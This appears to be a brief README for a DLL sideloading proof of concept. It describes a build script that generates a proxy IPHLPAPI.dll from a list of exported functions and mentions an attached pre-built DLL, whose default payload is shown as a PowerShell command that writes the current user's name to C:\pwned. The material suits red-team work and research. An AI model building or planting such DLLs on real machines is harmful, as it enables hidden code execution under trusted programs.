These are the associated files for []()

`export.txt` is a list of exported functions from DLL export viewer (https://www.nirsoft.net/utils/dll_export_viewer.html). 

`python build.py export.txt` which will generate `IPHLPAPI.dll` in `build/`. 

For convenience, we've attached a pre-generated IPHLPAPI.dll which will execute the default payload: 

```
system("powershell -command echo DLL sideloading successful as $(whoami) > C:\\\\pwned");
```
